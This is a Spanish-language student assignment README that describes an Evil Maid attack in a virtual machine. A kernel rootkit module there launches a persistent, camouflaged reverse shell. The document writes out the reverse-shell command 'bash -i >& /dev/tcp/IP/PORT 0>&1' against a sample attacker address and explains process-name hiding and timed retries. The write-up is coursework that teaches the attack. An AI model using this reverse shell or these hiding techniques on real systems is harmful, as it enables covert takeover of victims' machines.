# Tarea 1: Evil Maid

## Introducción

Evil Maid es un ataque que se basa en la suposición de que un atacante tiene acceso físico a la computadora de la víctima. El nombre proviene del clásico escenario de peligro, donde una mucama podría manipular la computadora desatendida de un viajero. El atacante puede modificar el sistema operativo o el software de cifrado para robar información sensible, como contraseñas o claves de cifrado. Este ataque es particularmente peligroso porque puede ser difícil de detectar y prevenir.

Este documento detalla la ejecución de un ataque Evil Maid en una máquina virtual corriendo en Ubuntu. El objetivo es demostrar cómo un atacante puede comprometer la seguridad de una computadora a través del acceso físico.

## Instruccciones para ejecutar el programa

## Descripción del ataque

Este tipo de atque aprovecha el acceso físico no supervisado para implantar código malicioso. Hay una serie de variantes, entre ellas:

- Bootloader tampering: 
- BIOS/UEFI-level implants:
- Kernel-level persistence:
- Pre-boot keyloggers:

La implementación realizada de este ataque utiliza la virante que utiliza un módulo rootkit del kernel para enviar un shell reverso en su payload. Este ataque permite al atacante obtener acceso al pdoer bootear desde un medio externo como Kali Live USB en este caso. De esta manera, el atacante puede injectar los componentes maliciosos sin elevar alguna alerta.

## Documentación del ataque

Este módulo de kernel (`rootkit.c`) implementa un ataque tipo **"Evil Maid"**, en el que un atacante obtiene acceso físico al dispositivo y carga un módulo malicioso que establece una **reverse shell persistente**.

Establecer una conexión remota desde el dispositivo comprometido hacia un servidor atacante, permitiendo el control total del sistema a través de una shell interactiva.

**Funcionalidad del modulo**

1. **Reverse shell**:
   - Utiliza `bash` para conectarse al host atacante (`ej. 192.168.198.128`) en el puerto `4444`.
   - Usa la sintaxis `bash -i >& /dev/tcp/IP/PORT 0>&1` para redirigir la entrada/salida estándar.

2. **Ejecución desde el kernel**:
   - Se ejecuta desde el espacio de kernel mediante `call_usermodehelper()`, una función que permite invocar comandos del espacio de usuario.

3. **Camuflaje del proceso**:
   - El shell se lanza con el nombre `EMShell` usando `exec -a`, lo que dificulta la detección mediante herramientas como `ps` o `top`.

4. **Persistencia por reintento**:
   - El módulo utiliza un `timer_list` del kernel que reintenta lanzar la shell cada 30 segundos si la conexión falla.
  
**Flujo del ataque**

- Al cargar el módulo, se inicializa un temporizador.
- Tras 1 segundo, intenta lanzar la reverse shell.
- Si falla, espera 30 segundos y vuelve a intentarlo.
- El proceso se repite indefinidamente mientras el módulo esté activo.

**Riesgos de seguridad**

- **Ejecución con privilegios de kernel**: Control total del sistema.
- **Canal encubierto**: Comunicación saliente sin visibilidad para usuarios comunes.
- **Difícil de detectar**: Camuflaje del proceso y ejecución desde bajo nivel.
- **Ideal para Evil Maid**: Puede ser precargado en sistemas antes de que el usuario legítimo lo utilice, especialmente vía USB o acceso físico.

## Autoevaluación

### Estado Final:

-

### Problemas encontrados:

-

### Limitaciones de la implementación:

-

### Log de commits:

### Calificación con la rúbrica:


## Lecciones Aprendidas

## Bibliografía

https://theinvisiblethings.blogspot.com/2009/10/evil-maid-goes-after-truecrypt.html

## Documentación del Código Fuente
